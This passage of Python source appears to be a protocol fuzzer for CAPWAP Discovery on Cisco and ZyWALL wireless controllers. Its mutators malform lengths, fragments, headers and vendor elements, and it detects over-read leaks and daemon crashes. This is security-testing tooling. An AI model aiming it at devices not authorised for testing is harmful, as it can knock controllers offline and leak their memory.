    val = rng.choice([0, 1, 0x7F, 0x80, 0xFF, 0x7FFF, 0xFFFF])
    if target == "msgelemslen":
        return [_set_msgelemslen(seed, val)], {
            "op": "magic-dict-len", "field": "msgelemslen", "value": val}
    if target in ("tlv39", "tlv37"):
        etype = 39 if target == "tlv39" else 37
        idx = _find_elem(seed, etype)
        if idx is None:
            return [seed], {"op": "magic-dict-len", "skipped": target}
        return [_set_elem_len(seed, idx, val)], {
            "op": "magic-dict-len", "field": target, "value": val}
    out = _t39_mutate(seed, **({"l1": val} if target == "l1" else {"l2": val}))
    return [out], {"op": "magic-dict-len", "field": target, "value": val}


def _havoc_primitives() -> list:
    """(name, fn(raw, rng) -> (raw, desc)) pool for stacked-havoc."""
    def inflate(etype):
        def f(raw, rng):
            idx = _find_elem(raw, etype)
            if idx is None:
                return raw, f"skip-tlv{etype}"
            return _set_elem_len(raw, idx, 0xFFFF), f"tlv{etype}:=FFFF"
        return f

    def inner(field):
        def f(raw, rng):
            val = rng.choice(INTERESTING_U16)
            out = _t39_mutate(raw, **{field: val})
            return out, f"{field}:={val:#x}"
        return f

    def flags_f(raw, rng):
        val = rng.choice([1, 0x7F, 0x80, 0xFF])
        return _t39_mutate(raw, flags=val), f"flags:={val:#x}"

    def elems_tiny(raw, rng):
        return _set_msgelemslen(raw, rng.choice([0, 1, 2, 3, 4])), "msgelemslen:=tiny"

    def msgtype5(raw, rng):
        return _set_msgtype(raw, 5), "msgtype:=5"

    def insert_bytes(raw, rng):
        elems = _element_offsets(raw)
        if not elems:
            return raw, "skip-insert"
        _t, start, _l = elems[rng.randrange(len(elems))]
        k = rng.randint(1, 4)
        return raw[:start] + b"\x41" * k + raw[start:], f"ins{k}@{start}"

    def delete_bytes(raw, rng):
        elems = _element_offsets(raw)
        if not elems:
            return raw, "skip-del"
        _t, start, _l = elems[rng.randrange(len(elems))]
        k = rng.randint(1, 4)
        return raw[:start] + raw[start + k:], f"del{k}@{start}"

    def dup_t39(raw, rng):
        idx = _find_elem(raw, 39)
        if idx is None:
            return raw, "skip-dup"
        _t, start, elen = _element_offsets(raw)[idx]
        return _append_element(raw, 39, raw[start + 4:start + 4 + elen]), "dup39"

    def shrink(raw, rng):
        etype = rng.choice([37, 39])
        idx = _find_elem(raw, etype)
        if idx is None:
            return raw, "skip-shrink"
        _t, _s, elen = _element_offsets(raw)[idx]
        k = rng.randint(1, 3)
        return _set_elem_len(raw, idx, max(0, elen - k)), f"tlv{etype}-={k}"

    return [("tlv39:=FFFF", inflate(39)), ("tlv37:=FFFF", inflate(37)),
            ("l1-interesting", inner("l1")), ("l2-interesting", inner("l2")),
            ("flags-nonzero", flags_f), ("msgelemslen-tiny", elems_tiny),
            ("msgtype:=5", msgtype5), ("insert-bytes", insert_bytes),
            ("delete-bytes", delete_bytes), ("dup-t39", dup_t39),
            ("shrink-tlv", shrink)]


def _m_stacked_havoc(seed: bytes, rng) -> tuple[list[bytes], dict]:
    """2-6 stacked random operators per round (AFL havoc style) — single-op
    variants cannot reach coupled conditions (child len + parent cap)."""
    prims = _havoc_primitives()
    n = rng.randint(2, 6)
    raw, applied = seed, []
    for _ in range(n):
        name, fn = prims[rng.randrange(len(prims))]
        raw, d = fn(raw, rng)
        applied.append(d)
    return [raw], {"op": "stacked-havoc", "n_ops": n, "ops": applied}


#: ordered registry: variant name -> (layer, builder)
MUTATORS: dict[str, tuple[str, Mutator]] = {}
for _name, _layer, _fn in [
    ("base", "core", _m_base),
    ("len-decl-gt", "m1", _m_len_decl_gt),
    ("len-decl-lt", "m1", _m_len_decl_lt),
    ("len-elem-overrun", "m1", _m_len_elem_overrun),
    ("len-hlen-mismatch", "m1", _m_len_hlen_mismatch),
    ("frag-single-off", "m2", _m_frag_single_off),
    ("frag-single-nolast", "m2", _m_frag_single_nolast),
    ("frag-missing", "m2", _m_frag_missing),
    ("frag-last-early", "m2", _m_frag_last_early),
    ("frag-overlap", "m2", _m_frag_overlap),
    ("frag-dup", "m2", _m_frag_dup),
    ("frag-conflict", "m2", _m_frag_conflict),
    ("frag-oob-offset", "m2", _m_frag_oob_offset),
    ("frag-rsvd-nonzero", "m2", _m_frag_rsvd_nonzero),
    ("hdr-version-1", "m3", _hdr_version(1)),
    ("hdr-version-15", "m3", _hdr_version(15)),
    ("hdr-ptype-dtls", "m3", _m_hdr_ptype_dtls),
    ("hdr-wbid-0", "m3", _hdr_wbid(0)),
    ("hdr-wbid-2", "m3", _hdr_wbid(2)),
    ("hdr-wbid-31", "m3", _hdr_wbid(31)),
    ("hdr-t-bit", "m3", _m_hdr_t_bit),
    ("hdr-k-bit", "m3", _m_hdr_k_bit),
    ("hdr-m0", "m3", _m_hdr_m0),
    ("hdr-rid-31", "m3", _m_hdr_rid_31),
    ("hdr-flags-nonzero", "m3", _m_hdr_flags_nonzero),
    ("hdr-wsi-present", "m3", _m_hdr_wsi),
    ("nest-depth-4", "m4", _m_nest_depth),
    ("nest-len-bad", "m4", _m_nest_len_bad),
    ("elemid-sweep", "m4", _m_elemid_sweep),
    ("plain-non-disc", "m5", _m_plain_non_disc),
    ("plain-echo", "m5", _m_plain_echo),
    ("msgtype-undef", "m5", _m_msgtype_undef),
    ("seq-jump", "m5", _m_seq_jump),
    ("seq-dup", "m5", _m_seq_dup),
    ("classic-random", "m6", _m_classic_random),
    # m7 — vendor-inner (ZyWALL t39/t37 Value internals; F2 2026-09-23)
    ("t39-len2-joint", "m7", _m_t39_len2_joint),
    ("t39-len1-joint", "m7", _m_t39_len1_joint),
    ("t39-len2-band", "m7", _m_t39_len2_band),
    ("t39-len1-band", "m7", _m_t39_len1_band),
    ("t39-len2-ship-short", "m7", _m_t39_len2_ship_short),
    ("t39-flags-shift", "m7", _m_t39_flags_shift),
    ("t39-flags-pad", "m7", _m_t39_flags_pad),
    ("t39-str1-pattern", "m7", _m_t39_str1_pattern),
    ("t39-gate-boundary", "m7", _m_t39_gate_boundary),
    ("t39-modelid-sweep", "m7", _m_t39_modelid_sweep),
    ("t37-subelem-sweep", "m7", _m_t37_subelem_sweep),
    # m8 — element-level structural operations
    ("elem-len-shrink", "m8", _m_elem_len_shrink),
    ("len-tiny-band", "m8", _m_len_tiny_band),
    ("elem-dup-t39", "m8", _m_elem_dup_t39),
    ("elem-swap-39-37", "m8", _m_elem_swap_39_37),
    ("elem-drop-t39", "m8", _m_elem_drop_t39),
    ("elem-tail-garbage", "m8", _m_elem_tail_garbage),
    ("datagram-trunc-t39", "m8", _m_datagram_trunc),
    # m9 — stacked / grooming / dictionary
    ("groom-then-trigger", "m9", _m_groom_then_trigger),
    ("magic-dict-len", "m9", _m_magic_dix_len_fields),
    ("stacked-havoc", "m9", _m_stacked_havoc),
]:
    MUTATORS[_name] = (_layer, _fn)

LAYER_METHODS: dict[str, list[str]] = {}
for _name, (_layer, _fn) in MUTATORS.items():
    LAYER_METHODS.setdefault(_layer, []).append(_name)


def expand_variants(spec: str) -> list[str]:
    """Expand a ``--variants`` spec (names, layer tokens like ``m1``, ``all``)."""
    chosen: set[str] = set()
    for token in (t.strip() for t in spec.split(",") if t.strip()):
        if token == "all":
            chosen.update(MUTATORS)
        elif token in LAYER_METHODS:
            chosen.update(LAYER_METHODS[token])
        elif token in MUTATORS:
            chosen.add(token)
        else:
            raise ValueError(f"unknown variant/layer {token!r}; layers: "
                             f"{sorted(LAYER_METHODS)}")
    return [n for n in MUTATORS if n in chosen]


# --------------------------------------------------------------------------
# canary: declared vs actual length (M1's over-read oracle)

def canary_check(raw: bytes, len_pad: int = 0) -> dict:
    """Declared-vs-actual length audit for one reply datagram.

    expected_total = HLEN*4 + 4(MessageType) + 1(SeqNum) + MsgElemsLen
    (RFC 5415 §4.5.1.3: MsgElemsLen counts from after SeqNum).
    ``extra_bytes > 0`` on a reply ⇒ the responder emitted bytes beyond its
    own declaration — the Heartbleed-style LEAK suspect flag.

    ``len_pad`` calibrates vendor MsgElemsLen semantics: ZyWALL 310
    (ZLD 4.73) fills MsgElemsLen as the *net* element-area length,
    excluding the 3-byte Length field itself (measured 2026-09-23: 251B
    reply with declared 235 = 16+235, RFC wording ⇒ 13+declared), so its
    replies carry a constant +3 offset — pad=3 zeroes it out and leaves
    genuine over-emission detectable.
    """
    actual = len(raw)
    if actual < 8:
        return {"parse": "too-short", "actual": actual}
    hlen = _hlen(raw)
    if actual < hlen + 8:
        return {"parse": "short-header", "actual": actual, "hlen": hlen}
    declared = _get_msgelemslen(raw)
    expected = hlen + 5 + declared + len_pad
    return {
        "parse": "ok",
        "msgtype": _get_msgtype(raw),
        "declared": declared,
        "actual": actual,
        "expected_total": expected,
        "extra_bytes": actual - expected,
        "leak_suspect": actual > expected,
    }


# --------------------------------------------------------------------------


class DiscoveryStageFuzzer:
    """Plaintext-UDP Discovery stage runner writing session.jsonl (D0)."""

    def __init__(self, ac_addr: tuple[str, int], out_dir: Path,
                 identities: tuple, variants: list[str],
                 rounds_per_variant: int, seed: int | None = None,
                 response_timeout: float = 3.0, round_gap: float = 1.0,
                 datagram_gap: float = 0.03, probe: bool = True,
                 probe_timeout: float = 0.7):
        import random
        self.ac_addr = ac_addr
        self.out_dir = Path(out_dir)
        self.identities = identities or (ApIdentity(),)
        self.variants = variants
        self.rounds_per_variant = rounds_per_variant
        self.rng = random.Random(seed)
        self.seed_value = seed
        self.response_timeout = response_timeout
        self.round_gap = round_gap
        self.datagram_gap = datagram_gap
        self.probe = probe
        self.probe_timeout = probe_timeout
        # ZyWALL MsgElemsLen excludes the 3-byte Length field itself
        # (RFC §4.5.1.3 wording includes it; measured +3 on every reply).
        self.canary_pad = 3 if any(
            isinstance(i, ZywallIdentity) for i in self.identities) else 0
        # Vendor dispatch: Cisco identities carry board data etc., ZyWALL ones
        # carry the Max/Used/IANA gates; the seed bytes differ accordingly.
        self.creators = {}
        for i in self.identities:
            if isinstance(i, ZywallIdentity):
                self.creators[i] = ZywallPayloadCreator(rng=self.rng, identity=i)
            else:
                self.creators[i] = CiscoPayloadCreator(rng=self.rng, identity=i)

    def _build_seed(self, identity) -> bytes:
        return bytes(self.creators[identity].create_discovery_request(valid=True))

    @staticmethod
    def _builder_for(variant: str, default: "Mutator", identity) -> "Mutator":
        """Vendor-aware builder: len-elem-overrun targets the identity
        element of the seed's vendor — 38 (WTP Board Data) for Cisco,
        39 (WTP Descriptor) for ZyWALL; the m7 t39/t37-internals variants
        pass through untouched on non-ZyWALL seeds."""
        if variant == "len-elem-overrun" and isinstance(identity, ZywallIdentity):
            return _len_elem_overrun(39)
        if variant in ZYWALL_ONLY_VARIANTS and not isinstance(identity, ZywallIdentity):
            return _m_vendor_skip
        return default

    def _probe(self, seq: int) -> tuple[bool, bytes | None]:
        """Primary Discovery (19) liveness probe — the (c)-plan oracle:
        the AC answers this with zero element validation, so silence means
        the daemon died (crash suspect)."""
        pkt = bytes.fromhex("0010000000000000") + (19).to_bytes(4, "big") \
            + bytes([seq & 0xFF]) + b"\x00\x03\x00"
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(self.probe_timeout)
            sock.sendto(pkt, self.ac_addr)
            try:
                data, _ = sock.recvfrom(65535)
                return True, data
            except (socket.timeout, ConnectionResetError, OSError):
                return False, None

    def _record_crash(self, round_no: int, variant: str, datagrams: list[bytes],
                      desc: dict, alive: bool) -> Path:
        """Persist one crash-suspect round: full datagram bytes + mutation +
        probe state — the minimal single-input attribution record."""
        cdir = self.out_dir / "crash"
        cdir.mkdir(parents=True, exist_ok=True)
        path = cdir / f"round{round_no:05d}-{variant}.json"
        path.write_text(json.dumps({
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "round": round_no, "variant": variant, "mutation": desc,
            "probe_alive_after": alive,
            "datagrams_hex": [d.hex() for d in datagrams],
            "ac": f"{self.ac_addr[0]}:{self.ac_addr[1]}",
            "seed": self.seed_value,
        }, ensure_ascii=False, indent=2), encoding="utf-8")
        return path

    def _exchange(self, datagrams: list[bytes]) -> tuple[bytes | None, str]:
        """Send the round's datagrams from a fresh source port; wait once."""
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(self.response_timeout)
            for i, dgram in enumerate(datagrams):
                if i:
                    time.sleep(self.datagram_gap)
                sock.sendto(dgram, self.ac_addr)
            try:
                data, addr = sock.recvfrom(65535)
                return data, f"{addr[0]}:{addr[1]}"
            except socket.timeout:
                return None, ""
            except (ConnectionResetError, OSError):
                # Windows raises WSAECONNRESET on the recvfrom when the
                # destination port is closed (ICMP unreachable); that is a
                # silence, not a crash.
                return None, ""

    def run(self) -> dict:
        self.out_dir.mkdir(parents=True, exist_ok=True)
        jsonl_path = self.out_dir / "session.jsonl"
        summary_path = self.out_dir / "summary.json"
        started = time.time()
        per_variant: dict[str, dict] = {}
        round_no = 0
        crash_files: list[str] = []
        # baseline probe: a round-1 kill must also be recorded, and a target
        # that was never alive must not smear crash_suspect over every round
        prev_alive: bool | None = None
        if self.probe:
            prev_alive, _ = self._probe(0)
        with jsonl_path.open("a", encoding="utf-8") as jf:
            for variant in self.variants:
                layer, builder = MUTATORS[variant]
                stat = per_variant.setdefault(variant, {
                    "layer": layer, "rounds": 0, "answered": 0, "silent": 0,
                    "leak_suspect": 0, "crash_suspect": 0, "resp_msgtypes": {}})
                for _ in range(self.rounds_per_variant):
                    round_no += 1
                    identity = self.identities[(round_no - 1) % len(self.identities)]
                    seed = self._build_seed(identity)
                    fn = self._builder_for(variant, builder, identity)
                    datagrams, desc = fn(seed, self.rng)
                    reply, addr = self._exchange(datagrams)
                    canary = canary_check(reply, self.canary_pad) if reply else None
                    outcome = "answered" if reply else "silence"
                    alive, _probe_reply = self._probe(round_no) if self.probe \
                        else (True, None)
                    crash_suspect = bool(self.probe and prev_alive and not alive)
                    if crash_suspect:
                        crash_files.append(str(self._record_crash(
                            round_no, variant, datagrams, desc, alive)))
                        stat["crash_suspect"] += 1
                    if self.probe:
                        prev_alive = alive
                    stat["rounds"] += 1
                    stat["answered" if reply else "silent"] += 1
                    if canary and canary.get("leak_suspect"):
                        stat["leak_suspect"] += 1
                    if canary and canary.get("parse") == "ok":
                        key = str(canary.get("msgtype"))
                        stat["resp_msgtypes"][key] = \
                            stat["resp_msgtypes"].get(key, 0) + 1
                    record = {
                        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                        "stage": "discovery",
                        "variant": variant,
                        "layer": layer,
                        "round": round_no,
                        "ap_mac": identity.ap_mac.hex(),
                        "ac": f"{self.ac_addr[0]}:{self.ac_addr[1]}",
                        "outcome": outcome,
                        "n_datagrams": len(datagrams),
                        "req_sha256": hashlib.sha256(datagrams[0]).hexdigest(),
                        "req_hex": datagrams[0].hex(),
                        "mutation": desc,
                        "probe_alive": alive if self.probe else None,
                        "crash_suspect": crash_suspect,
                        "resp_addr": addr,
                        "resp_len": len(reply) if reply else 0,
                        "resp_sha256": hashlib.sha256(reply).hexdigest() if reply else None,
                        "raw_reply_hex": reply.hex()[:256] if reply else None,
                        "canary": canary,
                        "seed": self.seed_value,
                    }
                    jf.write(json.dumps(record, ensure_ascii=False) + "\n")
                    jf.flush()
                    time.sleep(self.round_gap)
        summary = {
            "stage": "discovery",
            "ac": f"{self.ac_addr[0]}:{self.ac_addr[1]}",
            "seed": self.seed_value,
            "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(started)),
            "finished": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "rounds_per_variant": self.rounds_per_variant,
            "identities": [i.ap_mac.hex() for i in self.identities],
            "variants": per_variant,
            "crash_files": crash_files,
            "totals": {
                "rounds": sum(s["rounds"] for s in per_variant.values()),
                "answered": sum(s["answered"] for s in per_variant.values()),
                "silent": sum(s["silent"] for s in per_variant.values()),
                "leak_suspect": sum(s["leak_suspect"] for s in per_variant.values()),
                "crash_suspect": sum(s["crash_suspect"] for s in per_variant.values()),
            },
        }
        summary_path.write_text(json.dumps(summary, ensure_ascii=False, indent=2),
                                encoding="utf-8")
        return summary
